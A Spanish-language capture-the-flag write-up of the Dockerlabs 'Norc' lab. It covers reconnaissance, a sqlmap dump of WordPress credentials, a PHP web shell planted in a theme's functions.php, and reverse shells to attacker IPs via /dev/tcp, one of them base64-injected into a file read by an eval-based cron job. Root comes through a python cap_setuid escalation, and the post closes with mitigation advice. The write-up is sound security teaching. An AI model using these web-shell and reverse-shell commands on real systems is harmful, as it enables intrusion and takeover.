---
title: Write-up Dockerlabs - Norc
categories:
  - Write-up
  - Privilege Escalation
  - Laboratory
  - dockerlabs
tags:
  - nmap
  - hydra
  - smbmap
  - ssh
  - samba
  - rsa-injection
  - sudoers
  - docker
  - sqlmap
  - wordpress
  - cronjob
  - capabilities
toc: true
toc_label: Contenido del Reporte
toc_sticky: true
header:
  overlay_image: /assets/images/headers/dockerlabs.png
  overlay_filter: 0.7
og_image: /assets/images/headers/dockerlabs.png
seo_title: Write-up de Hacking en Dockerlabs - Norc (SQLi, RCE, PrivEsc con Cron)
seo_description: Análisis detallado de la vulneración de la máquina Norc de Dockerlabs, incluyendo inyección SQL en WordPress, acceso inicial y escalada de privilegios mediante Cronjob.
author: Maxi Barcia
date: 2025-11-07
draft: false
---

![Inicio del Laboratorio Dockerlabs - Norc](/assets/images/dockerlabs-norc/Pasted image 20251104173523.png)
![image-center](/assets/images/headers/dockerlabs.png)
{: .align-center}

![Lanzamiento del contenedor Docker con IP 172.17.0.2](/assets/images/dockerlabs-norc/Pasted image 20251030213115.png){: .align-center}
Se procede a lanzar el contenedor Docker sobre la máquina a vulnerar con número de IP **172.17.0.2**.

---
## 0. Executive Summary 🎯

(Aunque lo habías dejado pendiente, esta es la sección más crítica. Un ejecutivo o gerente no técnico leerá solo esto.)

- **Propósito:** Evaluar la seguridad del entorno **Dockerlabs - Norc**, un servidor web que aloja una instancia de **WordPress** y servicios auxiliares.
- **Hallazgo de Mayor Riesgo:** Se identificó una vulnerabilidad de **Inyección SQL** (SQLi) en el panel de login de WordPress (posiblemente asociada a un *plugin* desactualizado), lo que permitió la **extracción de credenciales de administrador** (hash de contraseña).
- **Impacto:** Un atacante obtuvo **Acceso al Sistema** (Shell de bajo privilegio) explotando una vulnerabilidad de **RCE** (Ejecución Remota de Código) a través de un *theme* de WordPress. Posteriormente, se logró la **Escalada de Privilegios a ROOT** explotando una configuración insegura en una tarea programada (Cronjob) que procesaba archivos con permisos elevados.
- **Medida Urgente:** **Actualizar WordPress y todos sus plugins/temas a las últimas versiones estables** y **revisar/restringir los permisos de ejecución** del script Cronjob de mantenimiento y las *capabilities* del binario `python`.

---
## 1. Reconocimiento y Detección de Servicios

El escaneo inicial con Nmap se dirigió a la IP **172.17.0.2** y reveló la presencia de varios servicios clave: **SSH** (Puerto 22) y un servidor web **HTTP** (Puerto 80), lo que sugirió un sistema operativo **Linux** subyacente.

**Comando de Escaneo Inicial:**
```bash
nmap -sCV -p 22,80 -n -Pn 172.17.0.2 -oN allPorts
![Resultado del escaneo de puertos con Nmap en 172.17.0.2](/assets/images/dockerlabs-norc/Pasted image 20251030215805.png)PuertoServicioVersiónEstado22/tcpsshOpenSSH 9.2p1 Debianopen80/tcphttpApache httpd 2.4.59 (Debian)openEl escaneo de servicios en el puerto 80 reveló una redirección al dominio norc.labs, lo que impedía la resolución. Se corrigió este problema agregando la entrada correspondiente en el archivo local /etc/hosts:Bashecho '172.17.0.2\tnorc.labs' | sudo tee -a /etc/hosts
2. Enumeración WebSe procedió con la enumeración de directorios y archivos utilizando Gobuster, identificando una instalación de WordPress por la presencia de archivos y rutas comunes como /wp-login.php, /wp-includes, y /readme.html.Comando de Enumeración de Directorios (Gobuster):Bash❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -u [http://norc.labs/](http://norc.labs/) -r -x html,php
El análisis posterior con Nuclei buscó vulnerabilidades conocidas en la plataforma WordPress, revelando una alerta:[CVE-2021-24917] [http] [high] [http://norc.labs/wp-admin/options.php](http://norc.labs/wp-admin/options.php) ["[http://norc.labs/ghost-login?redirect_to=%2Fwp-admin%2Fsomething&reauth=1](http://norc.labs/ghost-login?redirect_to=%2Fwp-admin%2Fsomething&reauth=1)"]
![Intento de login fallido en WordPress que indica contramedidas de fuerza bruta](/assets/images/dockerlabs-norc/Pasted image 20251103171551.png)3. Explotación: Inyección SQL y Acceso Inicial3.1. Explotación de Inyección SQL (SQLi)Aunque el panel de login tenía contramedidas contra la fuerza bruta, se enfocó la atención en la posible vulnerabilidad CVE-2023-6063, asociada al plugin WP Fastest Cache.Se utilizó SQLmap para explotar la vulnerabilidad y dumpear las credenciales de la base de datos de WordPress. Para optimizar el tiempo, se especificaron directamente las columnas de interés (user_login, user_pass, user_email) de la tabla wp_users.Bash# Dumpeo de columnas específicas para credenciales
sqlmap --dbms=mysql -u "[http://norc.labs/wp-login.php](http://norc.labs/wp-login.php)" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users -C user_login,user_pass,user_email --dump --batch
Credenciales Extraídas:Database: wordpress
Table: wp_users
[1 entry]
+------------+------------------------------------+----------------------------+
| user_login | user_pass | user_email |
+------------+------------------------------------+----------------------------+
| admin | $P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6. | admin@oledockers.norc.labs |
+------------+------------------------------------+----------------------------+
El correo electrónico (admin@oledockers.norc.labs) reveló un nuevo subdominio: oledockers.norc.labs. Se añadió al archivo /etc/hosts para su resolución.Al navegar al nuevo subdominio, se encontró una contraseña en texto plano, que se usó para obtener acceso al panel de WordPress:![Contraseña en texto plano encontrada en el subdominio oledockers.norc.labs](/assets/images/dockerlabs-norc/Pasted image 20251103171746.png)![Acceso al panel de administración de WordPress](/assets/images/dockerlabs-norc/Pasted image 20251103174434.png)3.2. Acceso al Sistema (RCE)Se modificó el archivo functions.php del theme activo para insertar una línea de código PHP que permitiera la Ejecución Remota de Comandos (RCE) a través de un parámetro GET:PHPsystem($_GET['cmd']);
![Modificación del archivo functions.php en el editor de temas de WordPress](/assets/images/dockerlabs-norc/Pasted image 20251104121907.png)Al navegar a la ruta del archivo modificado con un comando de prueba (id), se confirmó el RCE:http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=idSe utilizó la RCE para enviar una Reverse Shell a la máquina atacante.Comando de Reverse Shell (URL-Encoded):Bash[http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.171%2F1234%200%3E%261%22](http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.171%2F1234%200%3E%261%22)
4. Escalada de Privilegios (Privilege Escalation)4.1. Shell de Usuario (www-data) y Tratamiento TTYSe obtuvo una reverse shell inicial bajo el usuario www-data. Se aplicó el tratamiento TTY para obtener una consola interactiva estable:Bashscript /dev/null -c bash
# Presionar Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm-256color
export SHELL=bash
4.2. Escalada a Usuario kvzlx (Cronjob Inseguro)Durante la enumeración con linpeas.sh, se identificó una tarea programada (Cronjob) que se ejecutaba con permisos de otro usuario (posiblemente kvzlx) y que contenía una vulnerabilidad de ejecución de comandos.El script del Cronjob utilizaba la función eval de forma insegura, procesando contenido del archivo /var/www/html/.wp-encrypted.txt con permisos elevados.![Salida de linpeas.sh mostrando la vulnerabilidad en el script cron.sh](/assets/images/dockerlabs-norc/Pasted image 20251104161455.png)El uso de eval sin tratamiento adecuado permite la ejecución de comandos arbitrarios si se controla el contenido de ese archivo.Se procedió a codificar una reverse shell en Base64 para inyectarla en el archivo de texto y esperar a que el Cronjob se ejecutara:Comando Inyectado (Base64):Bash/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.18/4444 0>&1' 
# Base64: L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xOC80NDQ0IDA+JjEi
Se insertó el payload en el archivo y se esperó la ejecución de la tarea cron, lo que resultó en una nueva reverse shell con el usuario kvzlx.![Proceso de inyección de Base64 en .wp-encrypted.txt y obtención de shell como kvzlx](/assets/images/dockerlabs-norc/Pasted image 20251104161226.png)4.3. Acceso ROOT (Capabilities Inseguras)Una vez como usuario kvzlx, se buscó una segunda ruta de escalada, identificando binarios con Linux Capabilities asignadas de forma insegura.Comando de Búsqueda de Capabilities:Bashfind / -type f 2>/dev/null|xargs /sbin/getcap -r 2>/dev/null|grep cap_setuid=ep
![Binario de Python con la capability cap_setuid=ep](/assets/images/dockerlabs-norc/Pasted image 20251104171403.png)Se encontró que el binario /usr/bin/python3.9 tenía la capability cap_setuid=ep. Esta capability permite que el binario cambie su ID de usuario efectivo, lo que se puede explotar para elevar privilegios.Utilizando la guía de GTFOBins, se ejecutó el siguiente comando para obtener una shell de ROOT:Bash/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
La ejecución del comando resultó en el acceso final como el usuario ROOT.![Confirmación de acceso ROOT con el comando whoami](/assets/images/dockerlabs-norc/Pasted image 20251104163028.png)5. Conclusiones y Recomendaciones de MitigaciónEl laboratorio Norc demostró ser vulnerable en varias capas: la aplicación web (WordPress) y la configuración del sistema operativo (Cronjob y Capabilities).Recomendaciones de Mitigación:Parcheo y Actualización de WordPress:Actualizar WordPress, el theme y todos los plugins a sus últimas versiones estables para corregir vulnerabilidades conocidas (e.g., las asociadas a Inyección SQL).Seguridad del Archivo de Hosts:No exponer información sensible como contraseñas en texto plano en subdominios de fácil acceso (como se vio en oledockers.norc.labs).Configuración de Cronjobs (Mitigación de Elevación de Privilegios):Eliminar la función eval de los scripts de mantenimiento, especialmente si se ejecutan con permisos de usuarios distintos a www-data.Asegurar que los archivos procesados por scripts privilegiados no sean escribibles por usuarios de bajo privilegio.Uso de Capabilities:Eliminar la capability cap_setuid=ep del binario de Python (/usr/bin/python3.9) a menos que sea estrictamente necesario para la funcionalidad del sistema:Bashsudo setcap -r /usr/bin/python3.9
Monitoreo y Logueo:Implementar un monitoreo de integridad de archivos para detectar cambios no autorizados en archivos críticos de la aplicación web (como functions.php).